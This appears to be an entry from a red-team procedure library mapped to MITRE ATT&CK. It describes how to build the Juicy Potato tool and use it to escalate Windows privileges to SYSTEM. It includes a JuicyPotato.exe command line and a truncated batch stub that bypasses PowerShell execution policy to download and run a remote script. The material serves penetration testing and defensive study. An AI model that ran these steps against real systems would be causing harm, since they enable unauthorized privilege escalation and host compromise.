---
id: 8c07e59c-c73d-4761-b7c1-63b78da4efec
name: Escalate Windows Privileges with Juicy Potato
type: procedure
verified: true
submitted: true
created_at: '2020-06-24T21:19:46.855167+00:00'
updated_at: '2023-05-25T19:53:33.352128+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Access Token Manipulation|T1134 - Access Token Manipulation]]'
commands:
- '[[Execute a Program with the Juicy Potato Exploit]]'
---

# Escalate Windows Privileges with Juicy Potato

**Status**: ✓ Verified

## Summary

Juicy Potato is a privilege escalation tool which can be used to execute commands as SYSTEM, if the user has SeImpersonate or SeAssignPrimaryToken privileges. This vulnerability works on many versions of Windows, though it has been patched in Server 2019 and newer builds of Windows 10. 

## Description

# Description

Juicy Potato is a privilege escalation tool which can be used to execute commands as SYSTEM, if the user has SeImpersonate or SeAssignPrimaryToken privileges. This vulnerability works on many versions of Windows, though it has been patched in Server 2019 and newer builds of Windows 10.

# Instructions

## Preparation

As JuicyPotato is not always available as a pre-built binary, it may be necessary to build it from source using a Windows system and Visual Studio.

1. Download JuicyPotato: [Download from GitHub](https://github.com/ohpe/juicy-potato)

2. Open the solution file (\juicy-potato\JuicyPotat\JuicyPotato.sln) with Visual Studio 2015. If attempting to build JuicyPotato with VS2017 or VS2019, the SDK and platform values must be updated.
3. Set the "Solution Configuration" to "Release", then "Solution Platform" to the appropriate value.
4. Build the solution  via "Build" > "Rebuild Solution"

The final JuicyPotato.exe will be located in: \juicy-potato\JuicyPotato\Release\[ARCH]\JuicyPotato.exe

## Execution

1. Copy JuicyPotato.exe to the target system

2. Select a CLSID from this page: [https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard)

- The User should be: NT AUTHORIY\SYSTEM

- If JuicyPotato does not initially work, try another CLSID. 

- For example:

**Code**: [[Local Service                 App ID              ]]

3. Select a program or script which will be executed as SYSTEM. In this example, a simple .bat file  is executed, which downloads and runs a PowerShell script.

**Code**: [[@ECHO OFF
powershell.exe -ep bypass "iex(New-Objec]]

4. Execute JuicyPotato.exe with the script and CLSID as arguments

**Command** ([[Execute a Program with the Juicy Potato Exploit]]):

```bash
JuicyPotato.exe -l 9999 -p "C:\$FULL_PATH\$_TARGET.exe" -t * -c "$_CLSID"
```

Note: The port (9999) is chosen arbitrarily and can be changed if that port is in use.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Access Token Manipulation|T1134 - Access Token Manipulation]]

## Commands Used

- [[Execute a Program with the Juicy Potato Exploit]]
